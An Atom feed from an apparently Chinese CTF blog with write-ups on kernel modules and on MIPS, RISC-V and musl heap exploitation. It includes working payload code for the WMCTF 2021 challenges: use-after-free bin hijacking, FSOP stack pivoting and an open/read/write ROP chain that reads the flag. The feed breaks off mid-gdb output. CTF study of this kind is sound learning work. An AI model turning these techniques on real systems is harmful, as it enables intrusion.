<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="https://brooke-hub.github.io/atom.xml" rel="self"/>
  
  <link href="https://brooke-hub.github.io/"/>
  <updated>2021-09-09T11:11:22.046Z</updated>
  <id>https://brooke-hub.github.io/</id>
  
  <author>
    <name>WendyJellyBeans</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kernel_pwn初探</title>
    <link href="https://brooke-hub.github.io/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/"/>
    <id>https://brooke-hub.github.io/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/</id>
    <published>2021-09-09T10:49:49.000Z</published>
    <updated>2021-09-09T11:11:22.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><blockquote><p>之前实在看不懂Wiki上的入门讲解，现在跟着轩哥博客试着入门kernel</p></blockquote><h2 id="正向开发"><a href="#正向开发" class="headerlink" title="正向开发"></a>正向开发</h2><p>从<a href="https://blog.csdn.net/qb_2008/article/details/6835677">hello world</a> 开始</p><p>这里编译生成module.ko时会遇到一个报错</p><p><img src="/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/image-20210909185354811.png" alt="image-20210909185354811"></p><p>这是因为函数原型和调用这个函数时产生了冲突，如参数类型不一样等</p><p>所以加上参数类型void就可以了 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure><p>之后， 将module.ko加入内核模块，注意生成的模块名字不能以module命名，否则就会出现如下报错</p><p><img src="/2021/09/09/kernel-pwn%E5%88%9D%E6%8E%A2/image-20210909190445406.png" alt="image-20210909190445406"></p><p>module改成helloworld就好了</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_DIR := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">helloworld-objs := hello.o</span><br><span class="line">obj-m := helloworld.o</span><br><span class="line"><span class="section">default:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNEL_DIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dmesg | tail -n 1</span><br><span class="line">[49780.637874] Hello, world!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">dmesg | tail -n 2</span></span><br><span class="line">[49622.167231] module: module is already loaded</span><br><span class="line">[49780.637874] Hello, world!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">sudo rmmod helloworld</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">dmesg | tail -n 2</span></span><br><span class="line">[49780.637874] Hello, world!</span><br><span class="line">[50164.206571] Hello, exit!</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;之前实在看不懂Wiki上的入门讲解，现在跟着轩哥博客试着入门kernel&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;正向开发&quot;&gt;&lt;a</summary>
      
    
    
    
    
    <category term="kernel" scheme="https://brooke-hub.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>MIPS_PWN_入门</title>
    <link href="https://brooke-hub.github.io/2021/09/09/MIPS-PWN-%E5%85%A5%E9%97%A8/"/>
    <id>https://brooke-hub.github.io/2021/09/09/MIPS-PWN-%E5%85%A5%E9%97%A8/</id>
    <published>2021-09-09T03:58:37.000Z</published>
    <updated>2021-09-09T07:19:05.889Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>整理一下mips</p></blockquote><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>mipsrop</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Mplogin"><a href="#Mplogin" class="headerlink" title="Mplogin"></a>Mplogin</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">file Mplogin</span> </span><br><span class="line">Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">checksec Mplogin</span></span><br><span class="line">[*] &#x27;/home/wendy/Desktop/mips/Mplogin/Mplogin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>使用qemu的user模式mipsel（小端）运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">tree -N -L 2</span></span><br><span class="line">.</span><br><span class="line">├── lib</span><br><span class="line">│   ├── ld-uClibc.so.0</span><br><span class="line">│   └── libc.so.0</span><br><span class="line">└── Mplogin</span><br><span class="line"></span><br><span class="line">1 directory, 3 files</span><br></pre></td></tr></table></figure><p>题目给了lib 直接-L ./ 加载当前目录的lib库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">qemu-mipsel -L ./ Mplogin</span> </span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ida分析一下</p><p>sub_400840函数，再次打印时使用%s可以打印出栈信息</p><p>sub_400978函数，可以栈溢出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">qemu-mipsel -g 1237 -L ./ Mplogin</span> </span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : adminbbbb</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb-multiarch</span> </span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> ls</span></span><br><span class="line">lib  Mplogin</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> file Mplogin</span> </span><br><span class="line">Reading symbols from Mplogin...</span><br><span class="line">(No debugging symbols found in Mplogin)</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips</span></span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote :1237</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x00400920</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/09/MIPS-PWN-%E5%85%A5%E9%97%A8/image-20210909151721939.png" alt="image-20210909151721939"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;整理一下mips&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h2&gt;&lt;p&gt;mipsrop&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a </summary>
      
    
    
    
    
    <category term="mips" scheme="https://brooke-hub.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>RISC-V_pwn_初探</title>
    <link href="https://brooke-hub.github.io/2021/09/09/RISC-V-pwn-%E5%88%9D%E6%8E%A2/"/>
    <id>https://brooke-hub.github.io/2021/09/09/RISC-V-pwn-%E5%88%9D%E6%8E%A2/</id>
    <published>2021-09-09T02:04:00.000Z</published>
    <updated>2021-09-09T02:45:13.811Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>拖了很久的异构pwn，打算用*ctf2021的一道栈溢出来入门</p></blockquote><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb-multiarch -v</span></span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br></pre></td></tr></table></figure><h2 id="测试栈溢出"><a href="#测试栈溢出" class="headerlink" title="测试栈溢出"></a>测试栈溢出</h2><p>直接用题目给的qemu-riscv64运行即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./qemu-riscv64 -g 1234 ./main</span> </span><br><span class="line">Input the flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">You are wrong ._.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用gef调试方便riscv寄存器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb-multiarch</span> </span><br><span class="line"></span><br><span class="line">gef➤  file main</span><br><span class="line">Reading symbols from main...</span><br><span class="line">(No debugging symbols found in main)</span><br><span class="line">gef➤  set architecture riscv:rv64 </span><br><span class="line">The target architecture is assumed to be riscv:rv64</span><br><span class="line">gef➤  target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0x00000000000101c0 in ?? ()</span><br><span class="line"></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x6161616161616160 in ?? ()</span><br><span class="line"></span><br><span class="line">gef➤  p $pc</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = (void (*)()) 0x6161616161616160</span></span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>没有NX，所以一般的思路都是ret2shellcode</p><p>qemu-user的各种地址在同一个环境下都是固定的，包括栈地址，所以需要知道远端的栈地址，然后把shellcode放在栈上</p><p>题目给了远程环境的docker，可以本地调试得到远端地址</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;拖了很久的异构pwn，打算用*ctf2021的一道栈溢出来入门&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2</summary>
      
    
    
    
    
    <category term="异构" scheme="https://brooke-hub.github.io/tags/%E5%BC%82%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF_2021_pwn_复现</title>
    <link href="https://brooke-hub.github.io/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://brooke-hub.github.io/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-09-05T02:25:28.000Z</published>
    <updated>2021-09-13T08:30:13.500Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>准备复现5道musl pwn，其中4道都是1.2.2版本的，源码实在看不下去呜呜呜，还是跟之前学glibc一样，直接去gdb看数据来理解结构和内存管理。musl里没有malloc_hook和free_hook，所以保护全开的时候通常只能打FILE结构体。先从类似glibc的1.1.24版本入手。</p></blockquote><span id="more"></span><h2 id="WMCTF-2021-Nescafe"><a href="#WMCTF-2021-Nescafe" class="headerlink" title="WMCTF_2021_Nescafe"></a>WMCTF_2021_Nescafe</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./libc.so</span> </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.1.24</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><p>musl 1.1.24的版本和glibc差不多</p><p>chunk结构很相似，常用的小bin管理类似于smallbin的双向链表管理</p><p><a href="https://www.anquanke.com/post/id/202253#h2-4">从一次 CTF 出题谈 musl libc 堆漏洞利用</a></p><p>本题exp参考 <a href="https://blog.csdn.net/qq_39948058/article/details/120035403?spm=1001.2014.3001.5501">WMCTF 2021 pwn Azly复现</a></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>沙箱禁用了execve</p><p>chunk size 0x200</p><p>idx 0-4</p><p>free后指针没置零，可以edit和show</p><p>只能show一次</p><h3 id="如何劫持bins"><a href="#如何劫持bins" class="headerlink" title="如何劫持bins"></a>如何劫持bins</h3><blockquote><p>gdb下使用 <code>p mal</code> 可以查看所有bin</p></blockquote><p>①如下mal+384可以理解成bin</p><p>首先add两个0x200的chunk，bin一直指向top chunk以便下次分配</p><p>free chunk0后bin指向了chunk0</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210911221746016.png" alt="image-20210911221746016"></p><p>②uaf 修改chunk0的fd和bk</p><p>fd设置为bin-0x8以绕过后面的检查</p><p>bk设置为目标地址</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210911222824673.png" alt="image-20210911222824673"></p><p>③根据bins的head取出chunk0的空间，作为chunk2</p><p>进行类似smallbin的unlink操作</p><p>chunk2的bk（即目标地址stdin_FILE+0x40）作为bin的新head</p><p>目标地址stdin_FILE+0x40的fd被写入原chunk0的fd（不重要）</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210911222129217.png" alt="image-20210911222129217"></p><p>④根据bins的head取出stdin_FILE+0x40的空间，作为chunk3</p><p>成功申请到目标地址</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210911222907607.png" alt="image-20210911222907607"></p><h3 id="从stdin溢出到stdout"><a href="#从stdin溢出到stdout" class="headerlink" title="从stdin溢出到stdout"></a>从stdin溢出到stdout</h3><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210911174349792.png" alt="image-20210911174349792"></p><h3 id="（FSOP）修改-stdout-上的函数指针劫持程序控制流，进行栈迁移ROP"><a href="#（FSOP）修改-stdout-上的函数指针劫持程序控制流，进行栈迁移ROP" class="headerlink" title="（FSOP）修改 stdout 上的函数指针劫持程序控制流，进行栈迁移ROP"></a>（FSOP）修改 stdout 上的函数指针劫持程序控制流，进行栈迁移ROP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov_rdx = libc.address+<span class="number">0x000000000004951a</span> </span><br><span class="line"><span class="comment">#    0x7f687c98751a &lt;longjmp+34&gt;:mov    rdx,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="comment">#    0x7f687c98751e &lt;longjmp+38&gt;:mov    rsp,rdx</span></span><br><span class="line"><span class="comment">#    0x7f687c987521 &lt;longjmp+41&gt;:mov    rdx,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="comment">#    0x7f687c987525 &lt;longjmp+45&gt;:jmp    rdx</span></span><br><span class="line">payload = <span class="string">&#x27;E&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x50</span>)+p64(ret) <span class="comment">#0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(mov_rdx) <span class="comment">#0x40</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>])+p64(pop_rdx)+p64(<span class="number">0x500</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;pop_rdi&#x27;</span>,pop_rdi)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>*<span class="number">0xb0</span>+payload)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210911224458218.png" alt="image-20210911224458218"></p><p>这样就会执行gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rdi+0x30] </span><br><span class="line"># 将stdout_FILE+0x30地址上的内容（stdout_FILE+0x50）放入rdx </span><br><span class="line"># rdi:stdout_FILE+0x30 &#x2F;&#x2F; rdx:stdout_FILE+0x50</span><br><span class="line"></span><br><span class="line">mov    rsp,rdx  </span><br><span class="line"># 栈顶指向stdout_FILE+0x50（存放了pop rdi gadget地址）</span><br><span class="line">#   rsp&#x3D;rdx:stdout_FILE+0x50</span><br><span class="line"></span><br><span class="line">mov    rdx,QWORD PTR [rdi+0x38] </span><br><span class="line"># 将stdout_FILE+0x38地址上的内容（ret gadget地址）放入rdx</span><br><span class="line"># rdx: ret_addr</span><br><span class="line"></span><br><span class="line">jmp    rdx </span><br><span class="line"># 跳到ret gadget地址，执行pop rip</span><br><span class="line"># 将栈顶的pop rdi gadget地址弹出并跳转执行</span><br><span class="line"># 继续ROP，执行完read(0,addr,0x500)</span><br></pre></td></tr></table></figure><h3 id="执行-orw-ROP-读取-flag"><a href="#执行-orw-ROP-读取-flag" class="headerlink" title="执行 orw ROP 读取 flag"></a>执行 orw ROP 读取 flag</h3><p>向__stdout_FILE地址写入如下，</p><p>主要是在__stdout_FILE+0x38处开始写入gadget，再次ROP</p><p>因为执行SYS_read后会跳转到__stdout_FILE+0x38上的地址（调试得到偏移 ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span> </span><br><span class="line">payload += p64(pop_rdi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x100</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;open&#x27;</span>]) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x200</span>)+p64(pop_rdx) +p64(<span class="number">0x100</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x200</span>)+p64(pop_rdx) +p64(<span class="number">0x100</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]) </span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&quot;./flag\x00&quot;</span></span><br></pre></td></tr></table></figure><hr><h2 id="祥云杯-2021-babymull"><a href="#祥云杯-2021-babymull" class="headerlink" title="祥云杯_2021_babymull"></a>祥云杯_2021_babymull</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./libc.so</span> </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><p><a href="http://pzhxbz.cn/?p=172">新版musl libc 浅析</a></p><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！</a></p><p><a href="https://www.anquanke.com/post/id/241101#h2-5">借助DefCon Quals 2021的mooosl学习musl mallocng（源码审计篇）</a></p><p>本题exp参考 <a href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">第二届“祥云杯”网络安全大赛官方Writeup-Pwn篇</a> </p><h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><p>禁用了execve</p><p>只能在add写chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0x20</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line"><span class="keyword">void</span> *chunk_ptr; # chunk_Size &lt;= <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chunk_ptr指针free后没置0</p><p>有一次show机会</p><p>一次后门：将任意一地址的单字节置零，然后泄露任意一地址的 8 字节。</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912182016284.png" alt="image-20210912182016284"></p><h3 id="gdb查看数据结构"><a href="#gdb查看数据结构" class="headerlink" title="gdb查看数据结构"></a>gdb查看数据结构</h3><p>对着下图从头开始一个个分析结构</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/t015d8a64ff8626cf0d.png" alt="img"></p><h4 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context"></a>__malloc_context</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __malloc_context</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  secret = <span class="number">13395722478044406582</span>, </span><br><span class="line">  init_done = <span class="number">1</span>, </span><br><span class="line">  mmap_counter = <span class="number">0</span>, </span><br><span class="line">  free_meta_head = <span class="number">0</span>x0, </span><br><span class="line">  avail_meta = <span class="number">0</span>x5555560cc1f8,  <span class="comment">#meta_area中管理的空闲的meta首地址，用avail_meta_count表示数量</span></span><br><span class="line">  avail_meta_count = <span class="number">89</span>, </span><br><span class="line">  avail_meta_area_count = <span class="number">0</span>, </span><br><span class="line">  meta_alloc_shift = <span class="number">0</span>, </span><br><span class="line">  meta_area_head = <span class="number">0</span>x5555560cc000, </span><br><span class="line">  meta_area_tail = <span class="number">0</span>x5555560cc000, </span><br><span class="line">  avail_meta_areas = <span class="number">0</span>x5555560cd000 &lt;error: Cannot access memory at address <span class="number">0</span>x5555560cd000&gt;, </span><br><span class="line">  active = &#123;<span class="number">0</span>x0 &lt;repeats <span class="number">11</span> times&gt;, <span class="number">0</span>x5555560cc090, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc068, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc040, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc018, <span class="number">0</span>x0 &lt;repeats <span class="number">24</span> times&gt;&#125;, <span class="comment"># 堆管理器依据申请的size，将chunk分成48类chunk。缓存可继续分配的meta，数组下标与大小有关。</span></span><br><span class="line">  usage_by_class = &#123;<span class="number">0</span> &lt;repeats <span class="number">48</span> times&gt;&#125;, <span class="comment"># 